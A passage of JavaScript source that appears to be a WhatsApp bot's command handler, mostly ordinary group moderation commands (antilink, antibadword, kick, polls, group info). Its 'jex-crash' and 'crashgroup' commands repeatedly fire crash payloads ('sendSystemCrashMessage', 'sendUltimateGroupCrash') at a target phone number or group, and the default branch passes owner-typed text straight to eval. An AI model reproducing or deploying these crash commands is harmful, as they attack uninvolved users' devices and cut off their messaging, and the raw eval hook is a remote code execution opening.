        if (!m.quoted) return reply(`Reply to any media with caption ${prefix + command}`);

        conn.sendMessage(m.chat, {
          forward: m.quoted.fakeObj,
          mentions: participants.map((a) => a.id),
        });
}
break
case "poll": {
if (!Access) return reply(mess.owner);
        if (!m.isGroup) return reply(mess.group);
        let [poll, opt] = text.split("|");
        if (text.split("|") < 2)
            return await reply(
                `Enter a question and at least 2 options\nExample: ${prefix}poll Who is best player?|Messi,Ronaldo,None...`
            );
        let options = [];
        for (let i of opt.split(",")) {
            options.push(i);
        }
        
        await conn.sendMessage(m.chat, {
            poll: {
                name: poll,
                values: options,
            },
        });
}
break
case 'antilink': {
    if (!m.isGroup) return reply(mess.group);
    if (!m.isAdmin && !Access) return reply(mess.notadmin);
    if (!m.isBotAdmin) return reply(mess.botadmin);
    
    const mode = args[0]?.toLowerCase();
    const action = args[1]?.toLowerCase(); // Get second argument (on/off)
    
    // Show help if no arguments
    if (!mode) {
        const status = await db.getGroupSetting(botNumber, m.chat, 'antilink', false);
        const currentMode = await db.getGroupSetting(botNumber, m.chat, 'antilinkmode', 'delete');
        return reply(`*ANTILINK SETTINGS*\n\nStatus: ${status ? '✅ ON' : '❌ OFF'}\nMode: ${currentMode}\n\nOptions:\n• ${prefix}antilink on\n• ${prefix}antilink off\n• ${prefix}antilink delete\n• ${prefix}antilink warn\n• ${prefix}antilink kick\n• ${prefix}antilink delete off\n• ${prefix}antilink warn off\n• ${prefix}antilink kick off`);
    }
    
    // Handle on/off (global toggle)
    if (mode === 'on') {
        await db.setGroupSetting(botNumber, m.chat, 'antilink', true);
        return reply('✅ Antilink has been enabled');
    }
    
    if (mode === 'off') {
        await db.setGroupSetting(botNumber, m.chat, 'antilink', false);
        return reply('✅ Antilink has been disabled');
    }
    
    // Handle mode settings with on/off action
    if (mode === 'delete' || mode === 'warn' || mode === 'kick') {
        
        // If user wants to turn this specific mode ON
        if (action === 'on') {
            await db.setGroupSetting(botNumber, m.chat, 'antilinkmode', mode);
            await db.setGroupSetting(botNumber, m.chat, 'antilink', true);
            return reply(`✅ *Successfully enabled antilink ${mode} mode*`);
        }
        
        // If user wants to turn this specific mode OFF
        if (action === 'off') {
            // Check what the current mode is
            const currentMode = await db.getGroupSetting(botNumber, m.chat, 'antilinkmode', 'delete');
            
            // If the current mode matches what they're trying to turn off
            if (currentMode === mode) {
                // Disable antilink completely
                await db.setGroupSetting(botNumber, m.chat, 'antilink', false);
                return reply(`✅ *Antilink has been disabled*`);
            } else {
                // They're trying to turn off a mode that's not active
                return reply(`⚠️ *Antilink is currently in ${currentMode} mode, not ${mode} mode*\n\nUse .antilink off to disable completely.`);
            }
        }
        
        // If no action specified (just ".antilink delete" without on/off)
        if (!action) {
            await db.setGroupSetting(botNumber, m.chat, 'antilinkmode', mode);
            await db.setGroupSetting(botNumber, m.chat, 'antilink', true);
            return reply(`✅ *Successfully enabled antilink ${mode} mode*`);
        }
    }
    
    reply(`Invalid option! Use: on, off, delete, warn, kick, or [mode] on/off`);
    break;
}
case 'allowlink': {
    if (!m.isGroup) return reply(mess.group);
    if (!m.isAdmin && !Access) return reply(mess.admin);
    if (!m.isBotAdmin) return reply(mess.botadmin);
    
    const action = args[0]?.toLowerCase();
    
    // Get target user from:
    // 1. Mentioned user
    // 2. Quoted message sender
    // 3. Argument (phone number)
    let target = m.mentionedJid[0] || (m.quoted ? m.quoted.sender : args[1]);
    
    if (!action) {
        const allowed = await db.getGroupSetting(botNumber, m.chat, 'allowlink', []);
        return reply(`*📋 ALLOWLINK COMMANDS*\n\n• ${prefix}allowlink add @user (or reply to their message)\n• ${prefix}allowlink remove @user (or reply to their message)\n• ${prefix}allowlink list\n• ${prefix}allowlink clear\n\nTotal allowed: ${allowed.length}`);
    }
    
    // ADD USER
    if (action === 'add') {
        if (!target) return reply('❌ Please mention the user, reply to their message, or provide their number!\nExample: .allowlink add @user');
        
        const jid = target.includes('@s.whatsapp.net') ? target : target + '@s.whatsapp.net';
        let allowed = await db.getGroupSetting(botNumber, m.chat, 'allowlink', []);
        
        if (allowed.includes(jid)) {
            return reply(`❌ @${jid.split('@')[0]} is already in allowlist`, { mentions: [jid] });
        }
        
        allowed.push(jid);
        await db.setGroupSetting(botNumber, m.chat, 'allowlink', allowed);
        
        // Get username for better response
        const name = await conn.getName(jid) || jid.split('@')[0];
        return reply(`✅ @${name} can now post links`, { mentions: [jid] });
    }
    
    // REMOVE USER
    if (action === 'remove') {
        if (!target) return reply('❌ Please mention the user, reply to their message, or provide their number!\nExample: .allowlink remove @user');
        
        const jid = target.includes('@s.whatsapp.net') ? target : target + '@s.whatsapp.net';
        let allowed = await db.getGroupSetting(botNumber, m.chat, 'allowlink', []);
        
        const index = allowed.indexOf(jid);
        if (index === -1) {
            return reply(`❌ @${jid.split('@')[0]} is not in allowlist`, { mentions: [jid] });
        }
        
        allowed.splice(index, 1);
        await db.setGroupSetting(botNumber, m.chat, 'allowlink', allowed);
        
        const name = await conn.getName(jid) || jid.split('@')[0];
        return reply(`✅ @${name} removed from allowlist`, { mentions: [jid] });
    }
    
    // LIST ALLOWED USERS
    if (action === 'list') {
        let allowed = await db.getGroupSetting(botNumber, m.chat, 'allowlink', []);
        
        if (allowed.length === 0) {
            return reply('📋 No users are allowed to post links');
        }
        
        let msg = `*📋 ALLOWED USERS (${allowed.length})*\n\n`;
        allowed.forEach((jid, i) => {
            msg += `${i + 1}. @${jid.split('@')[0]}\n`;
        });
        
        return conn.sendMessage(m.chat, { 
            text: msg, 
            mentions: allowed 
        }, { quoted: m });
    }
    
    // CLEAR ALL ALLOWED USERS
    if (action === 'clear') {
        await db.setGroupSetting(botNumber, m.chat, 'allowlink', []);
        return reply('✅ All users removed from allowlist');
    }
    
    reply(`❌ Invalid action! Use: add, remove, list, clear`);
    break;
}
case 'antidemote':
case 'ad': {
    if (!m.isGroup) return reply(mess.group);
    if (!m.isAdmin && !Access) return reply(mess.admin);
    if (!m.isBotAdmin) return reply(mess.botadmin);
  
    await antidemoteCommand(conn, m, args, botNumber);
    
    break;
}
case 'antipromote':
case 'ap': {
    if (!m.isGroup) return reply(mess.group);
    if (!m.isAdmin && !Access) return reply(mess.admin);
    if (!m.isBotAdmin) return reply(mess.botadmin);
    
    await antipromoteCommand(conn, m, args, botNumber);
    break;
}
case 'antitag': {
    if (!m.isGroup) return reply(mess.group);
    if (!m.isAdmin && !Access) return reply(mess.admin);
    if (!m.isBotAdmin) return reply(mess.botadmin);
    
    const mode = args[0]?.toLowerCase();
    const action = args[1]?.toLowerCase();
    
    // Delete mode
    if (mode === 'delete' && action === 'on') {
        await db.setGroupSetting(botNumber, m.chat, 'antitagmode', 'delete');
        await db.setGroupSetting(botNumber, m.chat, 'antitag', true);
        return reply('✅ *Successfully enabled antitag delete mode*');
    }
    if (mode === 'delete' && action === 'off') {
        await db.setGroupSetting(botNumber, m.chat, 'antitag', false);
        return reply('*Successfully disenabled antitag delete mode*');
    }
    
    // Warn mode
    if (mode === 'warn' && action === 'on') {
        await db.setGroupSetting(botNumber, m.chat, 'antitagmode', 'warn');
        await db.setGroupSetting(botNumber, m.chat, 'antitag', true);
        return reply('✅ *Successfully enabled antitag warn mode*');
    }
    if (mode === 'warn' && action === 'off') {
        await db.setGroupSetting(botNumber, m.chat, 'antitag', false);
        return reply('*Successfully disenabled antitag warn mode*');
    }
    
    // Kick mode
    if (mode === 'kick' && action === 'on') {
        await db.setGroupSetting(botNumber, m.chat, 'antitagmode', 'kick');
        await db.setGroupSetting(botNumber, m.chat, 'antitag', true);
        return reply('✅ *Successfully enabled antitag kick mode*');
    }
    if (mode === 'kick' && action === 'off') {
        await db.setGroupSetting(botNumber, m.chat, 'antitag', false);
        return reply('*Successfully disenabled antitag kick mode*');
    }
    
    // Show help if invalid
    reply('❌ Use: delete on/off, warn on/off, kick on/off');
    break;
}
case 'antitagadmin':
case 'antitagadm': {
    if (!m.isGroup) return reply(mess.group);
    if (!m.isAdmin && !Access) return reply(mess.admin);
    if (!m.isBotAdmin) return reply(mess.botadmin);
    
    const mode = args[0]?.toLowerCase();
    
    if (!mode) {
        const status = await db.getGroupSetting(botNumber, m.chat, 'antitagadmin', false);
        const currentAction = await db.getGroupSetting(botNumber, m.chat, 'antitagadminaction', 'warn');
        return reply(`*👑 ANTITAG ADMIN SETTINGS*\n\nStatus: ${status ? '✅ ON' : '❌ OFF'}\nAction: ${currentAction}\n\nOptions:\n• ${prefix}antitagadmin on\n• ${prefix}antitagadmin off\n• ${prefix}antitagadmin delete\n• ${prefix}antitagadmin warn\n• ${prefix}antitagadmin kick`);
    }
    
    // Handle on/off
    if (mode === 'on') {
        await db.setGroupSetting(botNumber, m.chat, 'antitagadmin', true);
        return reply('✅ Anti-tag admin has been enabled');
    }
    
    if (mode === 'off') {
        await db.setGroupSetting(botNumber, m.chat, 'antitagadmin', false);
        return reply('✅ Anti-tag admin has been disabled');
    }
    
    // Handle action settings
    if (mode === 'delete') {
        await db.setGroupSetting(botNumber, m.chat, 'antitagadminaction', 'delete');
        await db.setGroupSetting(botNumber, m.chat, 'antitagadmin', true); // Auto-enable
        return reply('✅ *Successfully enabled antitagadmin delete mode*');
    }
    
    if (mode === 'warn') {
        await db.setGroupSetting(botNumber, m.chat, 'antitagadminaction', 'warn');
        await db.setGroupSetting(botNumber, m.chat, 'antitagadmin', true); // Auto-enable
        return reply('✅ *Successfully enabled antitagadmin warn mode*');
    }
    
    if (mode === 'kick') {
        await db.setGroupSetting(botNumber, m.chat, 'antitagadminaction', 'kick');
        await db.setGroupSetting(botNumber, m.chat, 'antitagadmin', true); // Auto-enable
        return reply('✅ *Successfully enabled antitagadmin kick mode*');
    }
    
    reply(`❌ Invalid option! Use: on, off, delete, warn, kick`);
    break;
}
case "antibadword": {
if (!isGroup) return reply(global.mess.notgroup);
            if (!m.isAdmin) return reply(global.mess.notadmin);
            if (!m.isBotAdmin) return reply(global.mess.botadmin);

        const chatId = m.chat;
        const mode = args[0]?.toLowerCase();
        const action = args[1]?.toLowerCase();

        // Show help if no arguments
        if (!mode) {
            const status = await db.getGroupSetting(botNumber, chatId, 'antibadword', false);
            const currentAction = await db.getGroupSetting(botNumber, chatId, 'badwordaction', 'delete');
            const badwords = await db.getGroupSetting(botNumber, chatId, 'badwords', []);
            
            let helpText = `╭──❖ 「 ANTIBADWORD 」 ❖──
│
│  *Status* : ${status ? '✅ ON' : '❌ OFF'}
│  *Action* : ${currentAction}
│  *Words*  : ${badwords.length}
│
│  *Commands:*
│  • ${prefix}antibadword delete on
│  • ${prefix}antibadword delete off
│  • ${prefix}antibadword warn on
│  • ${prefix}antibadword warn off
│  • ${prefix}antibadword kick on
│  • ${prefix}antibadword kick off
│  • ${prefix}antibadword add <word>
│  • ${prefix}antibadword remove <word>
│  • ${prefix}antibadword list
│  • ${prefix}antibadword clear
│
│  *Examples:*
│  • ${prefix}antibadword delete on
│  • ${prefix}antibadword add fuck
│
╰─────────❖`;

            return reply(helpText);
        }

        // Handle add word
        if (mode === 'add') {
            const word = action;
            if (!word) return reply('❌ Please provide a word to add.\nExample: .antibadword add fuck');
            
            let badwords = await db.getGroupSetting(botNumber, chatId, 'badwords', []);
            if (badwords.includes(word.toLowerCase())) {
                return reply(`The word "${word}" is already in the list.`);
            }
            
            badwords.push(word.toLowerCase());
            await db.setGroupSetting(botNumber, chatId, 'badwords', badwords);
            
            return reply(`✅ Added *${word}* to badword list.\nTotal badwords: ${badwords.length}`);
        }

        // Handle remove word
        if (mode === 'remove') {
            const word = action;
            if (!word) return reply('Please provide a word to remove.\nExample: .antibadword remove fuck');
            
            let badwords = await db.getGroupSetting(botNumber, chatId, 'badwords', []);
            const index = badwords.indexOf(word.toLowerCase());
            
            if (index === -1) {
                return reply(`The word "${word}" is not in the list.`);
            }
            
            badwords.splice(index, 1);
            await db.setGroupSetting(botNumber, chatId, 'badwords', badwords);
            
            return reply(`✅ Removed *${word}* from badword list.\nTotal badwords: ${badwords.length}`);
        }

        // Handle list
        if (mode === 'list') {
            let badwords = await db.getGroupSetting(botNumber, chatId, 'badwords', []);
            
            if (badwords.length === 0) {
                return reply('📋 No badwords added yet. Use `.antibadword add <word>` to add some.');
            }
            
            let listText = `╭──❖ 「 BADWORD LIST 」 ❖──\n│\n`;
            badwords.forEach((word, i) => {
                listText += `│  ${i + 1}. ${word}\n`;
            });
            listText += `│\n╰─────────❖`;
            
            return reply(listText);
        }

        // Handle clear
        if (mode === 'clear') {
            await db.setGroupSetting(botNumber, chatId, 'badwords', []);
            return reply('✅ All badwords have been cleared from the list.');
        }

        // Handle action modes (delete, warn, kick)
        if (['delete', 'warn', 'kick'].includes(mode)) {
            if (!action || !['on', 'off'].includes(action)) {
                return reply(`❌ Please specify on or off.\nExample: .antibadword ${mode} on`);
            }

            const enabled = action === 'on';
            
            // Set the action type
            await db.setGroupSetting(botNumber, chatId, 'badwordaction', mode);
            // Enable/disable the feature
            await db.setGroupSetting(botNumber, chatId, 'antibadword', enabled);
            
            return reply(`✅ Antibadword *${mode}* has been *${action}* for this group.`);
        }

        // Invalid command
        reply('❌ Invalid command! Use `.antibadword` to see available commands.');
}
break
case "antisticker": {
            if (!isGroup) return reply(global.mess.notgroup);
            if (!m.isAdmin) return reply(global.mess.notadmin);
            if (!m.isBotAdmin) return reply(global.mess.botadmin);
            

        const chatId = m.chat;
        const mode = args[0]?.toLowerCase();
        const action = args[1]?.toLowerCase();

        // Show help if no arguments
        if (!mode) {
            const status = await db.getGroupSetting(botNumber, chatId, 'antisticker', false);
            const currentAction = await db.getGroupSetting(botNumber, chatId, 'antistickeraction', 'delete');
            
            let helpText = `╭──❖ 「 ANTISTICKER 」 ❖──
│
│  *Status* : ${status ? '✅ ON' : '❌ OFF'}
│  *Action* : ${currentAction}
│
│  *Commands:*
│  • ${prefix}antisticker delete on
│  • ${prefix}antisticker delete off
│  • ${prefix}antisticker warn on
│  • ${prefix}antisticker warn off
│  • ${prefix}antisticker kick on
│  • ${prefix}antisticker kick off
│
│  *Examples:*
│  • ${prefix}antisticker delete on
│  • ${prefix}antisticker warn on
│
╰─────────❖`;

            return reply(helpText);
        }

        // Handle action modes (delete, warn, kick)
        if (['delete', 'warn', 'kick'].includes(mode)) {
            if (!action || !['on', 'off'].includes(action)) {
                return reply(`Please specify on or off.\nExample: .antisticker ${mode} on`);
            }

            const enabled = action === 'on';
            
            // Set the action type
            await db.setGroupSetting(botNumber, chatId, 'antistickeraction', mode);
            // Enable/disable the feature
            await db.setGroupSetting(botNumber, chatId, 'antisticker', enabled);
            
            return reply(`✅ Antisticker *${mode}* has been *${action}* for this group.`);
        }

        // Invalid command
        reply('❌ Invalid command! Use `.antisticker` to see available commands.');
}
break
case "setgrouppp":
case "setppgroup": {
 if (!m.isGroup) return reply(mess.group);

    if (!quoted) return reply(`*Send or reply to an image with the caption ${prefix + command}*`);
    if (!/image/.test(mime)) return reply(`*Send or reply to an image with the caption ${prefix + command}*`);
    if (/webp/.test(mime)) return reply(`*Send or reply to an image with the caption ${prefix + command}*`);

    const medis = await conn.downloadAndSaveMediaMessage(quoted, "ppbot.jpeg");
    if (args[0] === "full") {
      const { img } = await generateProfilePicture(medis);
      await conn.query({
        tag: "iq",
        attrs: {
          to: m.chat,
          type: "set",
          xmlns: "w:profile:picture",
        },
        content: [
          {
            tag: "picture",
            attrs: {
              type: "image",
            },
            content: img,
          },
        ],
      });
      fs.unlinkSync(medis);
      reply("Group profile picture has been successfully set.");
    } else {
      await conn.updateProfilePicture(m.chat, { url: medis });
      fs.unlinkSync(medis);
      reply("Group profile picture has been successfully updated.");
    }
}
break
case "setgroupname": {
       if (!m.isGroup) return reply(mess.group);
        if (!m.isAdmin) return reply(mess.notadmin);
        if (!m.isBotAdmin) return reply(mess.botadmin);
        if (!text) return reply("*Desired groupname?*");

        await conn.groupUpdateSubject(m.chat, text);
        reply(mess.done);
}
break
case "tagadmin": {
    if (!m.isGroup) return reply(mess.group);
    const groupAdmins = participants.filter((p) => p.admin);
    const listAdmin = groupAdmins
      .map((v, i) => `${i + 1}. @${v.id.split("@")[0]}`)
      .join("\n");
    const owner = groupMetadata.owner || groupAdmins.find((p) => p.admin === "superadmin")?.id || m.chat.split`-`[0] + "@s.whatsapp.net";
    let text = `*Group Admins Here:*\n${listAdmin}`.trim();

    conn.sendMessage(
      m.chat,
      { text: text, mentions: [...groupAdmins.map((v) => v.id), owner] },
      { quoted: m }
    );
}
break
case "tagall2": {
try {
        
        if (!m.isGroup) return reply(mess.group);
        if (!m.isAdmin) return reply(mess.notadmin);
        if (!m.isBotAdmin) return reply(mess.botadmin);

        let message = "📢 *Attention Everyone!* \n\n";
        const mentions = participants.map(p => p.id);
        
        mentions.forEach(userId => {
            message += `@${userId.split('@')[0]} `;
        });

        await conn.sendMessage(from, {
            text: message,
            mentions,
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true
            }
        }, { quoted: mek });

    } catch (error) {
        console.error("TagAll Error:", error);
        reply("❌ Failed to tag all members");
    }
}
break
case "link":
case "linkgc": {
    if (!Access) return reply(mess.owner);
        if (!m.isGroup) return reply(mess.group);
    
    try {
        // Get fresh group metadata to ensure we have latest data
        const freshGroupMetadata = await conn.groupMetadata(m.chat);
        let groupInvite = await conn.groupInviteCode(m.chat);
        let groupOwner = freshGroupMetadata.owner ? `+${freshGroupMetadata.owner.split('@')[0]}` : "Unknown";
        let groupLink = `https://chat.whatsapp.com/${groupInvite}`;
        let memberCount = freshGroupMetadata.participants.length;

        let message = `🔗 *GROUP LINK*\n\n` +
                      `📌 *Name:* ${freshGroupMetadata.subject}\n` +
                      `👑 *Owner:* ${groupOwner}\n` +
                      `🆔 *Group ID:* ${freshGroupMetadata.id}\n` +
                      `👥 *Members:* ${memberCount}\n\n` +
                      `🌍 *Link:* ${groupLink}\n\n> ${global.wm}`;

        await conn.sendMessage(m.chat, { text: message }, { detectLink: true });
    } catch (error) {
        console.error('Error generating group link:', error);
        reply("❌ *Failed to fetch group link. Make sure the bot has admin permissions.*");
    }
}
break
case "unmute":
case "open": {
        if (!m.isGroup) return reply(mess.group);
        if (!m.isAdmin) return reply(mess.notadmin);
        if (!m.isBotAdmin) return reply(mess.botadmin);
        conn.groupSettingUpdate(m.chat, "not_announcement");
        reply("Group opened by admin. Members can now send messages.");
}
break
case "add": {
        if (!m.isGroup) return reply(mess.group);
        if (!m.isAdmin) return reply(mess.notadmin);
        if (!m.isBotAdmin) return reply(mess.botadmin);
         if (!text) return reply(`*Please provide phone number with no country code.*\nExample: ${prefix + command} 256755585369`);


        
        let bws = m.quoted
            ? m.quoted.sender
            : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        await conn.groupParticipantsUpdate(m.chat, [bws], "add");
        reply(mess.done);
}
break
case "kick": {       
        if (!m.isGroup) return reply(mess.group);
       if (!m.isAdmin) return reply(mess.notadmin);
       if (!m.isBotAdmin) return reply(mess.botadmin);
        let bck = m.mentionedJid[0]
            ? m.mentionedJid[0]
            : m.quoted
            ? m.quoted.sender
            : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        await conn.groupParticipantsUpdate(m.chat, [bck], "remove");
        reply(mess.done);
}
break
case "getgrouppp":
case "grouppp":
case "groupicon":
case "groupavatar": {
     if (!m.isGroup) return reply(mess.group);

    try {
      const ppUrl = await conn.profilePictureUrl(m.chat, 'image');

      await conn.sendMessage(m.chat, 
        { 
          image: { url: ppUrl }, 
          caption: `🔥 *This Group's Profile Picture*`
        }, 
        { quoted: m }
      );
    } catch {
      await conn.sendMessage(m.chat, 
        { 
          image: { url: 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60' }, 
          caption: '⚠️ No profile picture found for this group.'
        }, 
        { quoted: m }
      );
    }
}
break
case "groupinfo": {
try {
        if (!isGroup) return reply("❌ This command can only be used in groups");

        const metadata = await conn.groupMetadata(from);
        let ppUrl;
        try {
            ppUrl = await conn.profilePictureUrl(from, "image");
        } catch {
            ppUrl = "https://i.imgur.com/8nLFCVP.png"; // Default group icon
        }

        const infoText = `
*${metadata.subject}*

👥 *Participants:* ${metadata.size}
👑 *Owner:* @${metadata.owner.split('@')[0]}
📝 *Description:* ${metadata.desc || "None"}
🆔 *Group ID:* ${metadata.id}
`.trim();

        await conn.sendMessage(from, {
            image: { url: ppUrl },
            caption: infoText,
            mentions: [metadata.owner],
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true
            }
        }, { quoted: mek });

    } catch (error) {
        console.error("GInfo Error:", error);
        reply("❌ Failed to get group information");
    }
}
break
case "resetlinkgc": {
if (!m.isGroup) return reply(mess.group)
if (!m.isAdmin) return reply(mess.notadmin);
if (!m.isBotAdmin) return reply(mess.botadmin);

conn.groupRevokeInvite(from)
reply("*group link reseted by admin*" )
}
break
case "userjid":
case "userid": {
if (!m.isGroup) return reply(mess.group);
if (!m.isAdmin) return reply(mess.notadmin);
    if (!m.isBotAdmin) return reply(mess.botadmin);
        const groupMetadata = m.isGroup
            ? await conn.groupMetadata(m.chat).catch((e) => {})
            : "";
        const participants = m.isGroup
            ? await groupMetadata.participants
            : "";
        let textt = `Here is jid address of all users of\n *${groupMetadata.subject}*\n\n`;
        for (let mem of participants) {
            textt += `□ ${mem.id}\n`;
        }
        reply(textt);
}
break
//======================
case 'jex-crash': {    
    if (!Access) return reply(mess.owner);
    
    if (!text) return reply(`\`Example:\` : ${prefix + command} 256×××`);
    let target = text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    
    reply(`*[!] Successfully sent bugs to target...*`); 
    
    // Send multiple crash cycles
    for (let i = 0; i < 3; i++) {
        await generateMassivePayload(conn, target);
        await sendSystemCrashMessage(conn, target);
        await sendListMessage(conn, target);
        await sendLiveLocationMessage(conn, target);
        await sendViewOnceMessages(conn, target);
        await sendPaymentInvite(conn, target);
        await sendExtendedTextMessage(conn, target);
    }
    
    break;
}
case 'crashgroup':
case 'crash-gc': {    
    if (!Access) return reply(mess.owner);
    
    if (!text) return reply(`*Example:* ${prefix + command} https://chat.whatsapp.com/xxxxx`);
    
    // If it's a WhatsApp invite link, get the group JID
    if (text.includes('chat.whatsapp.com')) {
        const inviteCode = text.split('chat.whatsapp.com/')[1].split('?')[0];
        try {
            const groupData = await conn.groupGetInviteInfo(inviteCode);
            groupJid = groupData.id;
        } catch (e) {
            return reply(`Failed to get group info. Make sure the bot is in the group or the link is valid.`);
        }
    }
    
    reply(`*[!] Sending ultimate group crash to target group...*\n\nGroup: ${groupJid}`);
    
    // Get participants if bot is in the group
    let participants = [];
    try {
        const metadata = await conn.groupMetadata(groupJid);
        participants = metadata.participants.map(p => p.id);
    } catch (e) {}
    
    for (let i = 0; i < 5; i++) {
        await sendUltimateGroupCrash(conn, groupJid, participants);
        await new Promise(resolve => setTimeout(resolve, 300));
    }
    
    break;
}
//======================
case 'botbackup':
case 'bp': {
if (!Access) return reply(mess.owner)
const sessionPath = "./session";
if (fs.existsSync(sessionPath)) {
const files = fs.readdirSync(sessionPath);
files.forEach((file) => {
if (file !== "creds.json") {
const filePath = path.join(sessionPath, file); 
if (fs.lstatSync(filePath).isDirectory()) {
fs.rmSync(filePath, { recursive: true, force: true });
} else {  
fs.unlinkSync(filePath);
}
}
}
);
}
const ls = execSync("ls").toString().split("\n").filter(
(pe) =>           
pe != "node_modules" &&   
pe != "package-lock.json" &&  
pe != "yarn.lock" &&
pe != "tmp" &&
pe != ""
);
execSync(`zip -r backup.zip ${ls.join(" ")}`);
await conn.sendMessage(m.chat, {
document: fs.readFileSync("./backup.zip"),   
fileName: "Jexploit-base-new.zip",
mimetype: "application/zip",
caption: "This is your backup zip.",
}, { quoted: m });
execSync("rm -rf backup.zip");
}
break
        
default:
if (body.startsWith("~")) {
if (!Access) return;
console.log('*execute...*')
function Return(sul) {
let sat = JSON.stringify(sul, null, 2)
let bang = util.format(sat)
if (sat === undefined) {
bang = util.format(sul)
}
return bang;
}
try {
(async () => {
try {
const result = await eval(`(async () => { return ${text} })()`)
console.log(Return(result))
} catch (e) {
console.log(util.format(e))
}
})()
} catch (e) {
console.log(util.format(e))
}
}
if (budy.startsWith("X")) {
if (!Access) return
await reaction(m.chat, '⚡')
try {
let evaled = await eval(q)
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
console.log(evaled)
} catch (err) {
console.log(util.format(err))
}
}
}
} catch (err) {
console.log(err)
}
}

let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file)
console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
delete require.cache[file]
require(file)
})